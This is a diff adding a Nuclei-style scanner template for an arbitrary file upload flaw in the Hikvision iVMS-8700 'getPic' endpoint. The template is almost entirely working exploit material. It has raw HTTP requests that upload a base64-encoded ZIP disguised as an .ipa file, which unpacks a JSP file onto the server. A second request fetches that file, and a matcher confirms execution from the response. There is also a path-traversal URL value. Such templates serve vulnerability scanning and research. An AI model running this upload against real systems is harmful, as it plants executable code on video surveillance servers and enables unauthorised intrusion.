@@ -1,0 +1,47 @@
+id: hikvision-ivms8700-getpic-fileupload
+
+info:
+  name: 海康威视 ivms8700 getPic 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+variables:
+  boundary: "{{rand_base(20)}}"
+  filename: "{{rand_base(5)}}"
+  filedata: "UEsDBBQAAAAAAHqmblcAAAAAAAAAAAAAAAALAAAAdGVzdDEvdGVzdC9QSwMEFAAAAAgABXjkVk0oP2r5AAAABBgAABQAAAB0ZXN0MS90ZXN0Ly5EU19TdG9yZe2YwUrDQBRF74wRArqYpct8gdA/iGUEl0LAtdZKXaRNKOo6f6b/4080mbmlLQ2h3bX0nizOhPcmeSQk8xgAZvw9HQGuHaaINu1gD8Z7Q5a+7iaHa3ygxBM87vGG86Cr/RbPbeVfWO7UX6MuZ6PivZrX6+Sh3Hnl/aSsJnxYfy//vw/D+dOj8uvPw2v5KZaLslrMwnsRQgghdjFc328ghBD7/4eMzukm2jBu6WRrjqMzOqeb4PaItnRCp7SjMzqnm2jD+1g6oVPa0RmdQwjRw1WU69b/x/AJCSEuDZP4wo8HNossG4HXcLZpBPqaABv3s+66sRoBIU6TFVBLAwQUAAAAAACSpm5XAAAAAAAAAAAAAAAAGAAAAHRlc3QxL3Rlc3QvUGV0cmVsSEQuYXBwL1BLAwQUAAAACADTpG5XpgvrG2QAAABqAAAAFAAAAHRlc3QxL3Rlc3QvY2VzaGkuanNwHchNCsJADAbQq7gpTFyEUqsgFZeuRU8Q9EMjYWacpu31+7N871KlwTkXjW4xtM35dNy3dXOoqYuYdj8ZhTXxTQ1BcjZ9iWuK/IE/IHYX/4aC/4De13uijAbfmoj4jUUI1FXXGVBLAwQUAAAAAAB0pm5XAAAAAAAAAAAAAAAABgAAAHRlc3QxL1BLAQI/ABQAAAAAAHqmblcAAAAAAAAAAAAAAAALACQAAAAAAAAAEAAIAAAAAAB0ZXN0MS90ZXN0LwoAIAAAAAAAAQAYAJzzr1X5FtoBAAAAAAAAAAAAAAAAAAAAAFBLAQI/ABQAAAAIAAV45FZNKD9q+QAAAAQYAAAUACQAAAAAAAAAgAAAACkAAAB0ZXN0MS90ZXN0Ly5EU19TdG9yZQoAIAAAAAAAAQAYAAC5GSxFrtkBAAAAAAAAAAAAAAAAAAAAAFBLAQI/ABQAAAAAAJKmblcAAAAAAAAAAAAAAAAYACQAAAAAAAAAMAAAAFQBAAB0ZXN0MS90ZXN0L1BldHJlbEhELmFwcC8KACAAAAAAAAEAGADQnSFw+RbaAQAAAAAAAAAAAAAAAAAAAABQSwECPwAUAAAACADTpG5XpgvrG2QAAABqAAAAFAAkAAAAAAAAACAACACKAQAAdGVzdDEvdGVzdC9jZXNoaS5qc3AKACAAAAAAAAEAGAD2qMt89xbaAQAAAAAAAAAAAAAAAAAAAABQSwECPwAUAAAAAAB0pm5XAAAAAAAAAAAAAAAABgAkAAAAAAAAABAAAAAgAgAAdGVzdDEvCgAgAAAAAAABABgAKnx7TvkW2gEAAAAAAAAAAAAAAAAAAAAAUEsFBgAAAAAFAAUA6wEAAEQCAAAAAA=="
+
+http:
+  - raw:
+      - |
+        POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1
+        Accept-Encoding: gzip
+        Content-Length: 640
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        User-Agent: MicroMessenger
+        Connection: close
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="type"
+
+        ios
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.ipa"
+        Content-Type: None
+
+        {{base64_decode(filedata)}}
+
+        --{{boundary}}--
+      - |
+        GET /msp/upload/ios/{{filename}}/test1/test/ceshi.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MicroMessenger
+
+    payloads:
+      token1: 
+      - "{{RootURL}}/msp/api/../home/upload.actionsecretKeyIbuilding"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,'true') && contains(body_2,'1728481950')
